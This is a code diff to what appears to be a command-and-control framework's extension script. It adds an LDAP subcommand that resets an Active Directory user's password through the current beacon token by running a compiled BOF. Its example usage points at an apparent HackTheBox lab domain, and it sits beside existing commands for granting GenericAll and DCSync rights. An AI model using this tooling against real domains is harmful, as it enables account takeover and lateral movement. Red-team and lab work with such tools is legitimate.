@@ -1383,6 +1383,31 @@ _cmd_removegenericall.setPreHook(function (id, cmdline, parsed_json, ...parsed_l
     ax.execute_alias(id, cmdline, `execute bof "${bof_path}" ${bof_params}`, `Removing GenericAll from ${target}...`);
 });
 
+var _cmd_setpasswordauth = ax.create_command(
+    "set-password-auth",
+    "Reset a user password using current beacon token (no explicit creds)",
+    "ldap set-password-auth l.wilson_adm 'N3wP@ssw0rd!' -dc dc01.garfield.htb\n" +
+    "ldap set-password-auth l.wilson_adm 'N3wP@ssw0rd!' -dc dc01.garfield.htb --ldaps"
+);
+_cmd_setpasswordauth.addArgString("target", true, "Username or DN");
+_cmd_setpasswordauth.addArgString("password", true, "New password");
+_cmd_setpasswordauth.addArgFlagString("-ou", "ou_path", false, "Search base (optional)");
+_cmd_setpasswordauth.addArgFlagString("-dc", "dc_fqdn", false, "DC hostname — FQDN not IP");
+_cmd_setpasswordauth.addArgBool("--ldaps", "Use LDAPS port 636 (default: LDAP 389)");
+_cmd_setpasswordauth.setPreHook(function(id, cmdline, parsed_json, ...parsed_lines) {
+    let target    = parsed_json["target"];
+    let is_dn     = identifyInputType(target);
+    let password  = parsed_json["password"];
+    let ou_path   = parsed_json["ou_path"] || "";
+    let dc_fqdn   = parsed_json["dc_fqdn"] || "";
+    let use_ldaps = parsed_json["--ldaps"] ? 1 : 0;
+
+    let bof_params = ax.bof_pack("cstr,int,cstr,cstr,cstr,int",
+        [target, is_dn, password, ou_path, dc_fqdn, use_ldaps]);
+    let bof_path = ax.script_dir() + "_bin/LDAP/set-password-auth." + ax.arch(id) + ".o";
+    ax.execute_alias(id, cmdline, `execute bof "${bof_path}" ${bof_params}`,
+        `Resetting password for ${target} using current token...`);
+});
 
 
 var cmd_ldap = ax.create_command("ldap", "LDAP domain interactions (LDAP-BOF)");
@@ -1395,7 +1420,7 @@ cmd_ldap.addSubCommands([_cmd_addgenericall, _cmd_addgenericwrite, _cmd_adddcsyn
 cmd_ldap.addSubCommands([_cmd_setattribute, _cmd_setdelegation, _cmd_setowner, _cmd_setspn, _cmd_setpassword, _cmd_setuac ]);
 cmd_ldap.addSubCommands([_cmd_removeace, _cmd_removeattribute, _cmd_removedelegation, _cmd_removedcsync, _cmd_removegenericall, _cmd_removegenericwrite,
                          _cmd_removegroupmember, _cmd_removeobject, _cmd_removerbcd, _cmd_removespn, _cmd_removeuac, ]);
-
+cmd_ldap.addSubCommands([_cmd_setpasswordauth]);
 
 var group_ldap = ax.create_commands_group("LDAP-BOF", [cmd_ldap]);
 ax.register_commands_group(group_ldap, ["beacon", "gopher", "kharon"], ["windows"], []);
